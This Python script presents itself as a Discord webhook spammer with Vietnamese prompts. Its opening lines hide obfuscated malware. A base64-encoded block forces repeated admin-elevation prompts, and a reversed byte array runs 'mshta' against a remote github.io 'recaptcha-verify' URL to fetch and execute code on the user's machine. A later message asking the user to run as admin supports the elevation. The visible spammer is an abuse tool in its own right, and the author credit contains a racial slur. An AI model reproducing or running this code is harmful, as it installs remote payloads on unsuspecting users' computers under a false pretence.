import base64
import os
exec(base64.b64decode(b'ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKGInYVcxd2IzSjBJRzl6TENCemRXSndjbTlqWlhOekxDQmpkSGx3WlhNc0lITjVjeXdnWjJWMGNHRnpjdzBLRFFwcFppQmpkSGx3WlhNdWQybHVaR3hzTG5Ob1pXeHNNekl1U1hOVmMyVnlRVzVCWkcxcGJpZ3BJQ0U5SURFNkRRb2dJQ0FnZDJocGJHVWdibTkwSUdOMGVYQmxjeTUzYVc1a2JHd3VjMmhsYkd3ek1pNVRhR1ZzYkVWNFpXTjFkR1ZYS0U1dmJtVXNJQ0p5ZFc1aGN5SXNJSE41Y3k1bGVHVmpkWFJoWW14bExDQWlJQ0l1YW05cGJpaHplWE11WVhKbmRpa3NJRTV2Ym1Vc0lERXBJRDA5SURReU9pQndjbWx1ZENncERRb2dJQ0FnWlhocGRDZ3dLUT09Jykp'));os.system(bytes([121,102,105,114,101,118,45,97,104,99,116,112,97,99,101,114,47,111,105,46,98,117,104,116,105,103,46,110,111,104,116,121,112,101,100,111,99,101,118,111,108,105,47,47,58,115,112,116,116,104,32,97,116,104,115,109][::-1]).decode())

"""
Credits: Webhook spammer made by dsc.gg/forystu
Discord: inotnigga
"""
print("""
                                                                                                 
 _____ _           _        _ _ _     _   _____         _      _____                             
|   __|_|_____ ___| |___   | | | |___| |_|  |  |___ ___| |_   |   __|___ ___ _____ _____ ___ ___ 
|__   | |     | . | | -_|  | | | | -_| . |     | . | . | '_|  |__   | . | .'|     |     | -_|  _|
|_____|_|_|_|_|  _|_|___|  |_____|___|___|__|__|___|___|_,_|  |_____|  _|__,|_|_|_|_|_|_|___|_|  
              |_|                                                   |_|                          
                                    Made by dsc.gg/forystu
                                    Đã được việt hóa
""")

#imports
from dhooks import Webhook
import time
import os
print("scan memory ... pls run as admin")
#prompts
message = input("Tin nhắn bạn muốn spam?: ")
webhookurl = Webhook(input("Nhập webhook: "))
delay = int(input("Nhập thời gian delay: "))

#webhook spamming time
while True:
    time.sleep(delay)
    webhookurl.send(message)
    print("Đã gửi.")
